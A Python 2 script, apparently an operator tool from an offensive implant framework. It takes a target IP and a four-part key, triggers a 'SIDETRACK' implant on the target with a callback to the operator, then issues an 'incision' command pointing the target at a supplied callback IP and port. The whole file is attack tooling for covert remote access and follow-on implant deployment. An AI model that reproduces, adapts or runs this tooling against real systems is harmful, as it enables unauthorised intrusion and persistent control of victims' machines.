#!/usr/bin/python
import base
import string
import sys
import crypto
import struct

def GetRandomPort():
    rand = crypto.GetRandom()
    port = struct.unpack("H", rand[:2])[0]
    if port < 10000:
        port = port + 10000
    return port

#
# Check the command line arguments
#
if len( sys.argv ) < 6:
    print "Usage %s: <target ip> \"cv1 cv2 cv3 cv4\" <time offset>" % \
          (sys.argv[0])
    print "                        <incision callback ip> <incision callback port>"
    print "                        [sidetrack trigger port] [sidetrack callback port]"
    sys.exit()

base.redir.connect("localhost",912)
base.dblevel = 5

#
# Create the target class
#
target          = base.Target()
target.name     = 'side'
target.project  = 'side'
target.host     = 'side'
target.ip       = sys.argv[1]
target.timediff = 0
target.protocol = base.GetProtocol('tcpstream')
key             = string.split(sys.argv[2])
cv1             = eval("0x%sL" %(key[0]))
cv2             = eval("0x%sL" %(key[1]))
cv3             = eval("0x%sL" %(key[2]))
cv4             = eval("0x%sL" %(key[3]))
target.AddImplant('sidetrack')
target.SetImplantOpt('sidetrack', 'key', (cv1, cv2, cv3, cv4))
target.SetImplantOpt('sidetrack', 'version', 2.0)
base.RegisterTarget(target)

portTrigger  = GetRandomPort()
portCallback = GetRandomPort()
portCallFrom = GetRandomPort()

if len(sys.argv) > 6:
    portTrigger = eval(sys.argv[6])
if len(sys.argv) > 7:
    portCallback = eval(sys.argv[7])

#
# Create a SIDETRACK implant
#
implant = base.GetImplant("SIDETRACK")

#
# Assign the implant and target to a session
#
session      = base.Session(target, implant)
session.name = 'side'

#
# Get the necessary commands
#
connect  = session.GetCommand("connect")
timediff = session.GetCommand("timediff")
incision = session.GetCommand("incision")
done     = session.GetCommand("done")

# Set the time difference
if sys.argv[3] != '0':
    result = timediff.run(sys.argv[3])
    print result[1]

result = connect.run("me:%d/%d"%(portCallback, portCallFrom), portTrigger)

if result[0] == 0:
    print "Error, could not connect"
    sys.exit(1)
print result[1]

#
# Run the commands
#

#result = ping.run()
#print "%d: %s"%(result[0],result[1])

result = incision.run("%s:%s"%( sys.argv[4], sys.argv[5] ))
print result[1]

done.run("all")
